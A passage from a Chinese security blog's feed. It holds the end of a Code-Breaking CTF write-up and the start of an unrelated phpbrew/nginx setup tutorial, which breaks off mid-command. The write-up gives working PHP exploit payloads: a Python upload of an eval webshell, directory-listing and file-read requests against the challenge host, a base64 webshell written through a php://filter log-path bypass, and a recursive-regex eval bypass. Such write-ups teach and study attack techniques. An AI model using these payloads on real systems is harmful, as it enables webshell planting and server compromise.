class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br>files = &#123;<br>  <span class="hljs-string">&#x27;file&#x27;</span>: BytesIO(<span class="hljs-string">b&#x27;aaa&lt;?php eval($_GET[\&#x27;a\&#x27;]);//&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1000000</span>)<br>&#125;<br><br>res = requests.post(<span class="hljs-string">&#x27;http://51.158.75.42:8088/index.php&#x27;</span>, files=files, allow_redirects=<span class="hljs-literal">False</span>)<br>print(res.headers)<br></code></pre></td></tr></table></figure><p>找flag</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs zephir">http:<span class="hljs-comment">//51.158.75.42:8088/data/4eb574ea10f554cfb8e5c501931ff030/1.php?a=var_dump(scandir(&#x27;../../../&#x27;));</span><br><br>回显<br><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">22</span>) <span class="hljs-string">&quot;flag_php7_2_1s_c0rrect&quot;</span> [<span class="hljs-number">3</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;html&quot;</span> &#125; <br></code></pre></td></tr></table></figure><p>读取flag</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zephir">http:<span class="hljs-comment">//51.158.75.42:8088/data/4eb574ea10f554cfb8e5c501931ff030/1.php?a=var_dump(scandir(&#x27;../../../&#x27;));readfile(&#x27;../../../flag_php7_2_1s_c0rrect&#x27;);</span><br>回显<br><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">22</span>) <span class="hljs-string">&quot;flag_php7_2_1s_c0rrect&quot;</span> [<span class="hljs-number">3</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;html&quot;</span> &#125; flag&#123;<span class="hljs-number">216728</span>a834fb4c1e0bc6893e135f436e&#125;<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/code-breaking/3.png" alt="3"></p><h2 id="3-easy-phpmagic"><a href="#3-easy-phpmagic" class="headerlink" title="3. easy - phpmagic"></a>3. easy - phpmagic</h2><p>部分代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;read-source&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(show_source(<span class="hljs-keyword">__FILE__</span>));<br>&#125;<br><br>define(<span class="hljs-string">&#x27;DATA_DIR&#x27;</span>, dirname(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-string">&#x27;/data/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]));<br><br><span class="hljs-keyword">if</span>(!is_dir(DATA_DIR)) &#123;<br>    mkdir(DATA_DIR, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>&#125;<br>chdir(DATA_DIR);<br><br><span class="hljs-variable">$domain</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;domain&#x27;</span>]) ? <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;domain&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$log_name</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;log&#x27;</span>]) ? <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;log&#x27;</span>] : date(<span class="hljs-string">&#x27;-Y-m-d&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>) &amp;&amp; <span class="hljs-variable">$domain</span>):<br><span class="hljs-variable">$command</span> = sprintf(<span class="hljs-string">&quot;dig -t A -q %s&quot;</span>, escapeshellarg(<span class="hljs-variable">$domain</span>));<br>    <span class="hljs-variable">$output</span> = shell_exec(<span class="hljs-variable">$command</span>);<br><br>    <span class="hljs-variable">$output</span> = htmlspecialchars(<span class="hljs-variable">$output</span>, ENT_HTML401 | ENT_QUOTES);<br><br>    <span class="hljs-variable">$log_name</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>] . <span class="hljs-variable">$log_name</span>;<br>    <span class="hljs-keyword">if</span>(!in_array(pathinfo(<span class="hljs-variable">$log_name</span>, PATHINFO_EXTENSION), [<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;php3&#x27;</span>, <span class="hljs-string">&#x27;php4&#x27;</span>, <span class="hljs-string">&#x27;php5&#x27;</span>, <span class="hljs-string">&#x27;phtml&#x27;</span>, <span class="hljs-string">&#x27;pht&#x27;</span>], <span class="hljs-literal">true</span>)) &#123;<br>        file_put_contents(<span class="hljs-variable">$log_name</span>, <span class="hljs-variable">$output</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br><span class="hljs-keyword">endif</span>; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>$domain</code> 可控。但是通过函数<code>escapeshellarg()</code>进行了处理，不能命令注入,但是经过<code>shell_exec()</code>之后，<code>$output</code>中一定包含<code>$domain</code>。</p><p><code>$log_name </code>也是可控的，使用<code>pathinfo()</code>提取扩展名，限制的很全面，可以通过在路径末尾添加”/.”，可以使<code>pathinfo()</code>,获取不到扩展名，从而绕过黑名单检测。</p><p><img src="https://image.mengsec.com/code-breaking/4.png" alt="4"></p><p>在后面对<code>$log_name</code> 重新赋值时</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$log_name = $_SERVER[<span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>] . $log_name<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><code>$_SERVER[&#39;SERVER_NAME&#39;]</code>在<code>Apache2</code>没有设置<code>UseCanonicalName = On </code>和 <code>ServerName</code>时也是可控的。<br>它获取的就是客户端请求头中<code>Host</code>的值。<br><img src="https://image.mengsec.com/code-breaking/5.png" alt="5"></p><p>这样整个<code>$log_name</code>的内容就都可以控制了，由此我们可以传入<code>php</code>伪协议来写文件。</p><p>接下来是<code>$output</code>，也就是控制文件内容。</p><p>由于<code>htmlspecialchars()</code>将<code>&lt;&gt;</code>转成了HTML实体，需要进行编码绕过，<code>php</code>伪协议又支持<code>base64</code>解码，而且<code>php</code>在进行<code>base64</code>解码的时候如果遇到不是<code>base64</code>编码的字符会直接跳过。</p><p>这样我们就有思路了，<code>Host</code>与<code>log</code>组成<code>php</code>伪协议,<code>doamin</code>为写入的<code>shell</code>的<code>base64</code>，因为<code>base64</code>编码的最后才会使用等号进行补位，因此shell编码后不能包含等号。<br><code>&lt;?php @eval($_GET[&quot;a&quot;]);/**</code><br><code>base64</code>之后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">PD9waHAgQGV2YWwoJF9HRVRbImEiXSk7Lyoq<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/code-breaking/6.png" alt="6"></p><p>成功getshell<br><img src="https://image.mengsec.com/code-breaking/7.png" alt="7"></p><p>读取flag<br><img src="https://image.mengsec.com/code-breaking/8.png" alt="8"></p><h2 id="4-easy-phplimit"><a href="#4-easy-phplimit" class="headerlink" title="4. easy - phplimit"></a>4. easy - phplimit</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;    <br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里考察的其实是PHP正则表达式的递归模式。每一次迭代，php都会把表达式中的<code>(?R)</code>替换为<code>/[^\W]+\((?R)?\)/</code><br>这也就意味着我们传入的参数必须是不带参数的函数才可以。</p><p>这个题和RCTF2018中的r-cursive类似，原题是利用<code>getallheaders()</code>函数来绕过，但是这个题的环境为nginx。不能使用该函数获取数据。</p><p>PHP中提供了<code>get_defined_vars()</code>这个函数来获取所有已定义变量。</p><p>成功执行代码<br><img src="https://image.mengsec.com/code-breaking/9.png" alt="9"></p><p>读取flag</p><p><img src="https://image.mengsec.com/code-breaking/10.png" alt="10"></p><p>其他payload</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">readfile</span></span>(<span class="hljs-title">next</span>(<span class="hljs-title">array_reverse</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">dirname</span>(<span class="hljs-title">chdir</span>(<span class="hljs-title">dirname</span>(<span class="hljs-title">getcwd</span>())))))));</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpbrew+nginx打造多版本php开发环境</title>
    <link href="/2019/01/28/phpbrew-nginx%E6%89%93%E9%80%A0%E5%A4%9A%E7%89%88%E6%9C%ACphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
    <url>/2019/01/28/phpbrew-nginx%E6%89%93%E9%80%A0%E5%A4%9A%E7%89%88%E6%9C%ACphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<p>苦于Mac平台上没有类似于phpstudy这样的免费的集成开发环境，MAMP功能不够强大，Pro版又太贵了，MxSrvs这种的免费集成开发环境定制性不强。docker一个个编译安装部署又太过于麻烦，尝试了很多方法，踩了不少坑，最后决定在本地用phpbrew和nginx来实现多版本php集成开发环境。</p><a id="more"></a><h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><p>首先需要安装三个东西</p><ol><li>Homebrew</li><li>Nginx</li><li>phpbrew</li></ol><h3 id="1-1-安装Homebrew"><a href="#1-1-安装Homebrew" class="headerlink" title="1.1  安装Homebrew"></a>1.1  安装Homebrew</h3><p><a href="https://brew.sh/">HomeBrew</a>是Mac上的包管理器，非常好用。</p><p>一条命令就能安装</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/ruby -e &quot;$(curl -fsSL https:/</span><span class="hljs-regexp">/raw.githubusercontent.com/</span>Homebrew<span class="hljs-regexp">/install/m</span>aster/install)<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><h3 id="1-2-安装Nginx"><a href="#1-2-安装Nginx" class="headerlink" title="1.2 安装Nginx"></a>1.2 安装Nginx</h3><p>使用Homebrew可以很容易的安装nginx，默认的是安装Nginx最新版</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">brew </span><span class="hljs-keyword">install </span>nginx<br></code></pre></td></tr></table></figure><p>安装完毕后可以查看Nginx版本</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">$ nginx -v<br>nginx <span class="hljs-built_in">version</span>: nginx/<span class="hljs-number">1.15</span><span class="hljs-number">.8</span><br></code></pre></td></tr></table></figure><h3 id="1-3-安装PHPbrew"><a href="#1-3-安装PHPbrew" class="headerlink" title="1.3 安装PHPbrew"></a>1.3 安装PHPbrew</h3><p> <a href="https://github.com/phpbrew/phpbrew">PHPbrew</a> 是个多平台的php管理工具。在这里只列出我配置时的一些操作，具体请移步PHPbrew的<a href="https://github.com/phpbrew/phpbrew/wiki">wiki</a>。</p><ul><li>安装依赖</li></ul><p>对于Homebrew，则就是</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">xcode-select --<span class="hljs-keyword">install</span><br><span class="hljs-keyword">brew </span><span class="hljs-keyword">install </span>automake autoconf curl pcre <span class="hljs-keyword">bison </span>re2c mhash libtool icu4c gettext <span class="hljs-keyword">jpeg </span>openssl libxml2 mcrypt gmp libevent<br><span class="hljs-keyword">brew </span>link icu4c<br><span class="hljs-keyword">brew </span>link --force openssl<br><span class="hljs-keyword">brew </span>link --force libxml2<br></code></pre></td></tr></table></figure><p>对于后面的三个link操作，我这里都会出警告：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">Warning: Refusing <span class="hljs-keyword">to</span> <span class="hljs-keyword">link</span> macOS<span class="hljs-params">-provided</span> software:xxx<br></code></pre></td></tr></table></figure><p>猜测是SIP的问题，但是不想关SIP，就直接按照brew的提示直接把路径添加到环境变量里了。</p><ul><li>下载phpbrew。</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -L -O https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/phpbrew/</span>phpbrew<span class="hljs-regexp">/raw/m</span>aster/phpbrew<br>chmod +x phpbrew<br>sudo mv phpbrew <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>phpbrew<br></code></pre></td></tr></table></figure><ul><li>初始化phpbrew</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">phpbrew <span class="hljs-keyword">init</span><br></code></pre></td></tr></table></figure><ul><li>接着在 <code>.zshrc</code> 文件增加如下行(如果是命令行是Bash，那就在用户目录.bashrc下添加)</li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">[[ -e ~<span class="hljs-regexp">/.phpbrew/</span>bashrc ]] &amp;&amp; <span class="hljs-keyword">source</span> ~<span class="hljs-regexp">/.phpbrew/</span>bashrc<br></code></pre></td></tr></table></figure><ul><li>然后设置库路径</li></ul><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">phpbrew lookup-prefix homebrew</span><br></code></pre></td></tr></table></figure><h2 id="2-PHPbrew-简单使用方法"><a href="#2-PHPbrew-简单使用方法" class="headerlink" title="2. PHPbrew 简单使用方法"></a>2. PHPbrew 简单使用方法</h2><h3 id="2-1-PHP版本获取"><a href="#2-1-PHP版本获取" class="headerlink" title="2.1 PHP版本获取"></a>2.1 PHP版本获取</h3><p>列出已经安装的php</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">phpbrew list</span><br></code></pre></td></tr></table></figure><p>列出已知的PHP版本</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs erlang">$ phpbrew known<br><span class="hljs-number">7.3</span>: <span class="hljs-number">7.3</span>.<span class="hljs-number">1</span>, <span class="hljs-number">7.3</span>.<span class="hljs-number">0</span> ...<br><span class="hljs-number">7.2</span>: <span class="hljs-number">7.2</span>.<span class="hljs-number">14</span>, <span class="hljs-number">7.2</span>.<span class="hljs-number">13</span>, <span class="hljs-number">7.2</span>.<span class="hljs-number">12</span>, <span class="hljs-number">7.2</span>.<span class="hljs-number">11</span>, <span class="hljs-number">7.2</span>.<span class="hljs-number">10</span>, <span class="hljs-number">7.2</span>.<span class="hljs-number">9</span>, <span class="hljs-number">7.2</span>.<span class="hljs-number">8</span>, <span class="hljs-number">7.2</span>.<span class="hljs-number">7</span> ...<br><span class="hljs-number">7.1</span>: <span class="hljs-number">7.1</span>.<span class="hljs-number">26</span>, <span class="hljs-number">7.1</span>.<span class="hljs-number">25</span>, <span class="hljs-number">7.1</span>.<span class="hljs-number">24</span>, <span class="hljs-number">7.1</span>.<span class="hljs-number">23</span>, <span class="hljs-number">7.1</span>.<span class="hljs-number">22</span>, <span class="hljs-number">7.1</span>.<span class="hljs-number">21</span>, <span class="hljs-number">7.1</span>.<span class="hljs-number">20</span>, <span class="hljs-number">7.1</span>.<span class="hljs-number">19</span> ...<br><span class="hljs-number">7.0</span>: <span class="hljs-number">7.0</span>.<span class="hljs-number">33</span>, <span class="hljs-number">7.0</span>.<span class="hljs-number">32</span>, <span class="hljs-number">7.0</span>.<span class="hljs-number">31</span>, <span class="hljs-number">7.0</span>.<span class="hljs-number">30</span>, <span class="hljs-number">7.0</span>.<span class="hljs-number">29</span>, <span class="hljs-number">7.0</span>.<span class="hljs-number">28</span>, <span class="hljs-number">7.0</span>.<span class="hljs-number">27</span>, <span class="hljs-number">7.0</span>.<span class="hljs-number">26</span> ...<br><span class="hljs-number">5.6</span>: <span class="hljs-number">5.6</span>.<span class="hljs-number">40</span>, <span class="hljs-number">5.6</span>.<span class="hljs-number">39</span>, <span class="hljs-number">5.6</span>.<span class="hljs-number">38</span>, <span class="hljs-number">5.6</span>.<span class="hljs-number">37</span>, <span class="hljs-number">5.6</span>.<span class="hljs-number">36</span>, <span class="hljs-number">5.6</span>.<span class="hljs-number">35</span>, <span class="hljs-number">5.6</span>.<span class="hljs-number">34</span>, <span class="hljs-number">5.6</span>.<span class="hljs-number">33</span> ...<br><span class="hljs-number">5.5</span>: <span class="hljs-number">5.5</span>.<span class="hljs-number">38</span>, <span class="hljs-number">5.5</span>.<span class="hljs-number">37</span>, <span class="hljs-number">5.5</span>.<span class="hljs-number">36</span>, <span class="hljs-number">5.5</span>.<span class="hljs-number">35</span>, <span class="hljs-number">5.5</span>.<span class="hljs-number">34</span>, <span class="hljs-number">5.5</span>.<span class="hljs-number">33</span>, <span class="hljs-number">5.5</span>.<span class="hljs-number">32</span>, <span class="hljs-number">5.5</span>.<span class="hljs-number">31</span> ...<br><span class="hljs-number">5.4</span>: <span class="hljs-number">5.4</span>.<span class="hljs-number">45</span>, <span class="hljs-number">5.4</span>.<span class="hljs-number">44</span>, <span class="hljs-number">5.4</span>.<span class="hljs-number">43</span>, <span class="hljs-number">5.4</span>.<span class="hljs-number">42</span>, <span class="hljs-number">5.4</span>.<span class="hljs-number">41</span>, <span class="hljs-number">5.4</span>.<span class="hljs-number">40</span>, <span class="hljs-number">5.4</span>.<span class="hljs-number">39</span>, <span class="hljs-number">5.4</span>.<span class="hljs-number">38</span> ...<br><span class="hljs-number">5.3</span>: <span class="hljs-number">5.3</span>.<span class="hljs-number">29</span>, <span class="hljs-number">5.3</span>.<span class="hljs-number">28</span>, <span class="hljs-number">5.3</span>.<span class="hljs-number">27</span>, <span class="hljs-number">5.3</span>.<span class="hljs-number">26</span>, <span class="hljs-number">5.3</span>.<span class="hljs-number">25</span>, <span class="hljs-number">5.3</span>.<span class="hljs-number">24</span>, <span class="hljs-number">5.3</span>.<span class="hljs-number">23</span>, <span class="hljs-number">5.3</span>.<span class="hljs-number">22</span> ...<br></code></pre></td></tr></table></figure><p>使用 <code>--more</code>参数可以列出更多版本</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">phpbrew known <span class="hljs-comment">--more</span><br></code></pre></td></tr></table></figure><p>使用<code>--old</code>参数可以列出已知的旧版本</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">phpbrew known <span class="hljs-comment">--old</span><br></code></pre></td></tr></table></figure><h3 id="2-2-获取PHP编译参数"><a href="#2-2-获取PHP编译参数" class="headerlink" title="2.2 获取PHP编译参数"></a>2.2 获取PHP编译参数</h3><p>列出php的一些编译参数</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs vim">$ phpbrew variants<br>Variant<span class="hljs-variable">s:</span><br>  <span class="hljs-keyword">all</span>, apxs2, bcmath, bz2, calendar, cgi, cli, ctype, curl, dba, <span class="hljs-keyword">debug</span>, dom,<br>  dtrace, editline, embed, exif, fileinfo, <span class="hljs-built_in">filter</span>, fpm, ftp, gcov, gd,<br>  gettext, gmp, hash, <span class="hljs-built_in">iconv</span>, icu, <span class="hljs-keyword">imap</span>, inifile, inline, intl, ipc, ipv6,<br>  json, kerberos, ldap, libgcc, mbregex, mbstring, mcrypt, mhash, mysql,<br>  opcache, openssl, pcntl, pcre, pdo, pear, pgsql, phar, phpdbg, posix,<br>  readline, session, soap, sockets, sqlite, static, tidy, tokenizer, wddx,<br>  xml, xml_all, xmlrpc, zip, zlib, zts<br><br>Virtual variant<span class="hljs-variable">s:</span><br>  db<span class="hljs-variable">s:</span> sqlite, mysql, pgsql, pdo<br>  <span class="hljs-keyword">m</span><span class="hljs-variable">b:</span> mbstring, mbregex<br>  neutra<span class="hljs-variable">l:</span><br>  smal<span class="hljs-variable">l:</span> bz2, cli, dom, <span class="hljs-built_in">filter</span>, ipc, json, mbregex, mbstring, pcre, phar,<br>  posix, readline, xml, curl, openssl<br>  defaul<span class="hljs-variable">t:</span> bcmath, bz2, calendar, cli, ctype, dom, fileinfo, <span class="hljs-built_in">filter</span>, ipc,<br>  json, mbregex, mbstring, mhash, mcrypt, pcntl, pcre, pdo, pear, phar,<br>  posix, readline, sockets, tokenizer, xml, curl, openssl, zip<br>  everythin<span class="hljs-variable">g:</span> dba, ipv6, dom, calendar, wddx, static, inifile, inline, cli,<br>  ftp, <span class="hljs-built_in">filter</span>, gcov, zts, json, hash, exif, mbstring, mbregex, libgcc,<br>  pdo, posix, embed, sockets, <span class="hljs-keyword">debug</span>, phpdbg, zip, bcmath, fileinfo, ctype,<br>  cgi, soap, pcntl, phar, session, tokenizer, opcache, <span class="hljs-keyword">imap</span>, ldap, tidy,<br>  kerberos, xmlrpc, fpm, dtrace, pcre, mhash, mcrypt, zlib, curl, readline,<br>  editline, gd, intl, icu, openssl, mysql, sqlite, pgsql, xml, xml_all,<br>  gettext, <span class="hljs-built_in">iconv</span>, bz2, ipc, gmp, pear<br>  <br>Using variants <span class="hljs-keyword">to</span> build PHP:<br>  phpbrew install php-<span class="hljs-number">5.3</span>.<span class="hljs-number">10</span> +default<br>  phpbrew install php-<span class="hljs-number">5.3</span>.<span class="hljs-number">10</span> +mysql +pdo<br>  phpbrew install php-<span class="hljs-number">5.3</span>.<span class="hljs-number">10</span> +mysql +pdo +apxs2<br>  phpbrew install php-<span class="hljs-number">5.3</span>.<span class="hljs-number">10</span> +mysql +pdo +apxs2=/usr/bin/apxs2<br></code></pre></td></tr></table></figure><h3 id="2-3-编译PHP"><a href="#2-3-编译PHP" class="headerlink" title="2.3 编译PHP"></a>2.3 编译PHP</h3><p>默认配置安装PHP:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">phpbrew</span> install <span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">40</span> +default<br></code></pre></td></tr></table></figure><p>测试安装:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">phpbrew</span> install --test <span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">40</span><br></code></pre></td></tr></table></figure><p>显示debug信息:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">phpbrew</span> -d install --test <span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">40</span><br></code></pre></td></tr></table></figure><p>安装旧版本:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">phpbrew</span> install --old <span class="hljs-number">5</span>.<span class="hljs-number">2</span>.<span class="hljs-number">13</span><br></code></pre></td></tr></table></figure><h3 id="2-4-PHP使用和切换"><a href="#2-4-PHP使用和切换" class="headerlink" title="2.4 PHP使用和切换"></a>2.4 PHP使用和切换</h3><p>临时使用:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">phpbrew</span> use <span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">40</span><br></code></pre></td></tr></table></figure><p>切换版本(设置默认版本):</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">phpbrew</span> switch <span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">40</span><br></code></pre></td></tr></table></figure><p>关闭phpbrew:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">phpbrew</span> <span class="hljs-literal">off</span><br></code></pre></td></tr></table></figure><h2 id="3-配置过程"><a href="#3-配置过程" class="headerlink" title="3. 配置过程"></a>3. 配置过程</h2><p>首先编译需要的PHP版本，在此我使用php-fpm来实现PHP和Nginx通信，需要在编译php时，添加+fpm参数。</p><h3 id="3-1-编译php"><a href="#3-1-编译php" class="headerlink" title="3.1 编译php"></a>3.1 编译php</h3><p>在之前我已经配置好了php-5.6.40，在此我以php 7.2.14为例，再进行一次配置。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">phpbrew</span> install <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">14</span> +default +fpm +dbs +mb +bz<span 